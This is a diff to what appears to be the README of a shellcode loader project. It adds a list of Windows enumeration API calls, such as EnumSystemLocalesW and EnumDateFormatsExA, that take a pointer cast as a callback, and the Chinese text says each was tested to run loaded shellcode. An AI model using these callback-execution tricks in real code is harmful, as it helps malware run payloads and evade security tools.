@@ -124,6 +124,8 @@ python3 ./v0.5/trans.py
 
 WINDOWS库中，可利用的回调函数，经过测试，以下均可以成功执行回调函数加载shellcode。
 
+### 可利用的回调函数
+
 ```c++
 EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
 EnumTimeFormatsA((TIMEFMT_ENUMPROCA)ha, 0, 0);
@@ -138,6 +140,21 @@ EnumDesktopsW(NULL,(DESKTOPENUMPROCW)ha, NULL);
 EnumSystemCodePagesW((CODEPAGE_ENUMPROCW)ha, 0);
 EnumDateFormatsA((DATEFMT_ENUMPROCA)ha, 0, 0);
 EnumChildWindows(NULL, (WNDENUMPROC)ha, 0);
+
+EnumTimeFormatsW((TIMEFMT_ENUMPROCW)ha, NULL, NULL);
+EnumTimeFormatsW((TIMEFMT_ENUMPROCW)ha, NULL, NULL);
+EnumUILanguagesW((UILANGUAGE_ENUMPROCW)ha, NULL, NULL);
+EnumTimeFormatsEx((TIMEFMT_ENUMPROCEX)ha, NULL, NULL, NULL);
+EnumSystemLocalesW((LOCALE_ENUMPROCW)ha, NULL);
+EnumSystemLocalesEx((LOCALE_ENUMPROCEX)ha, NULL, NULL, NULL);
+EnumSystemLanguageGroupsW((LANGUAGEGROUP_ENUMPROCW)ha, NULL, NULL);
+EnumSystemGeoNames(NULL, (GEO_ENUMNAMEPROC)ha, NULL);
+EnumLanguageGroupLocalesW((LANGGROUPLOCALE_ENUMPROCW)ha, LGRPID_ARABIC, 0, NULL);
+EnumLanguageGroupLocalesA((LANGGROUPLOCALE_ENUMPROCA)ha, LGRPID_ARABIC, 0, NULL);
+EnumDateFormatsW((DATEFMT_ENUMPROCW)ha, NULL, NULL);
+EnumDateFormatsExW((DATEFMT_ENUMPROCEXW)ha, NULL, NULL);
+EnumDateFormatsExEx((DATEFMT_ENUMPROCEXEX)ha, NULL, NULL, NULL);
+EnumDateFormatsExA((DATEFMT_ENUMPROCEXA)ha, NULL, NULL);
 ```
 
 
